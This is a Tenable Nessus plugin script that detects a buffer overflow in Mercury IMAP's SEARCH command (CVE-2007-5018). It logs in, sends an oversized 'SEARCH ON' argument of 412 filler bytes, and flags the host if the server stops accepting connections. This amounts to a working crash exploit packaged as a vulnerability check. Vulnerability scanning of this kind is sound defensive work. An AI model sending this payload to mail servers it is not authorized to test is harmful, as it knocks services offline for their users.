#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if (description)
{
  script_id(26067);
  script_version("$Revision: 1.17 $");

  script_cve_id("CVE-2007-5018");
  script_bugtraq_id(25733);
  script_osvdb_id(39670);
  script_xref(name:"EDB-ID", value:"3418");

  script_name(english:"Mercury IMAP Server SEARCH Command Remote Buffer Overflow");
  script_summary(english:"Exploits a buffer overflow vulnerability in Mercury IMAP server");

 script_set_attribute(attribute:"synopsis", value:
"The remote IMAP server is affected by a buffer overflow vulnerability." );
 script_set_attribute(attribute:"description", value:
"The remote host is running the Mercury Mail Transport System, a free
suite of server products for Windows and NetWare associated with
Pegasus Mail. 

The remote installation of Mercury Mail includes an IMAP server that
is affected by a buffer overflow vulnerability.  Using a specially-
crafted SEARCH command, an authenticated, remote attacker can leverage
this issue to crash the remote application and even execute arbitrary
code remotely, subject to the privileges under which the application
runs." );
 script_set_attribute(attribute:"solution", value:
"Unknown at this time." );
  script_set_cvss_base_vector("CVSS2#AV:N/AC:M/Au:S/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:POC/RL:U/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
 script_cwe_id(119);
 script_set_attribute(attribute:"plugin_publication_date", value: "2007/09/20");
 script_cvs_date("$Date: 2016/05/20 14:12:06 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_end_attributes();


  script_category(ACT_DENIAL);
  script_family(english:"Gain a shell remotely");

  script_copyright(english:"This script is Copyright (C) 2007-2016 Tenable Network Security, Inc.");

  script_dependencies("find_service2.nasl");
  script_require_keys("imap/login", "imap/password");
  script_require_ports("Services/imap", 143);

  exit(0);
}


include("global_settings.inc");
include("imap_func.inc");


# We need credentials to exploit the issue.
user = get_kb_item("imap/login");
pass = get_kb_item("imap/password");
if (!user || !pass)
{
  exit(0, "imap/login and/or imap/password are empty");
}


port = get_kb_item("Services/imap");
if (!port) port = 143;
if (!get_port_state(port)) exit(0);


# Make sure it's Mercury Mail.
banner = get_imap_banner(port:port);
if (!banner || "IMAP4rev1 Mercury/32" >!< banner) exit(0);


# Establish a connection.
soc = open_sock_tcp(port);
if (!soc) exit(0);


# Read banner.
s = recv_line(socket:soc, length:1024);
if (!strlen(s))
{
  close(soc);
  exit(0);
}


# Log in.
++tag;
resp = NULL;
c = string("nessus", string(tag), " LOGIN ", user, " ", pass);
send(socket:soc, data:string(c, "\r\n"));
while (s = recv_line(socket:soc, length:1024))
{
  s = chomp(s);
  m = eregmatch(pattern:string("^nessus", string(tag), " (OK|BAD|NO)"), string:s, icase:TRUE);
  if (!isnull(m))
  {
    resp = m[1];
    break;
  }
}


# If successful, select the INBOX.
if (resp && resp =~ "OK")
{
  ++tag;
  resp = NULL;
  c = string("nessus", string(tag), " SELECT inbox");
  send(socket:soc, data:string(c, "\r\n"));
  while (s = recv_line(socket:soc, length:1024))
  {
    s = chomp(s);
    m = eregmatch(pattern:string("^nessus", string(tag), " (OK|BAD|NO)"), string:s, icase:TRUE);
    if (!isnull(m))
    {
      resp = m[1];
      break;
    }
  }

  # If successful, try to exploit the flaw to crash the server.
  if (resp && resp =~ "OK")
  {
    ++tag;
    resp = NULL;
    c = string("nessus", string(tag), " SEARCH ON ", crap(412));
    send(socket:soc, data:string(c, "\r\n"));
    while (s = recv_line(socket:soc, length:1024))
    {
      s = chomp(s);
      m = eregmatch(pattern:string("^nessus", string(tag), " (OK|BAD|NO)"), string:s, icase:TRUE);
      if (!isnull(m))
      {
        resp = m[1];
        break;
      }
    }

    # If there was no response...
    if (0 == strlen(s))
    {
      failed = 0;
      tries = 5;
      for (iter=1; iter<=tries; iter++)
      {
        soc2 = open_sock_tcp(port);
        if (soc2) s2 = recv_line(socket:soc, length:2048);

        # Consider it a problem if we get two consecutive failures 
        # to establish a connection or read the banner.
        if (soc2 && strlen(s2))
        {
          close(soc2);
          if (failed) break;
        }
        else failed++;

        if (failed > 1)
        {
          security_warning(port);
          exit(0);
        }
      }
    }
  }
}
else if (resp =~ "BAD" || resp =~ "NO")
{
  debug_print("couldn't login with supplied imap credentials!", level:1);
}


# Logout.
++tag;
resp = NULL;
c = string("nessus", string(tag), " LOGOUT");
send(socket:soc, data:string(c, "\r\n"));
while (s = recv_line(socket:soc, length:1024))
{
  s = chomp(s);
  m = eregmatch(pattern:string("^nessus", string(tag), " (OK|BAD|NO)"), string:s, icase:TRUE);
  if (!isnull(m))
  {
    resp = m[1];
    break;
  }
}
close(soc);
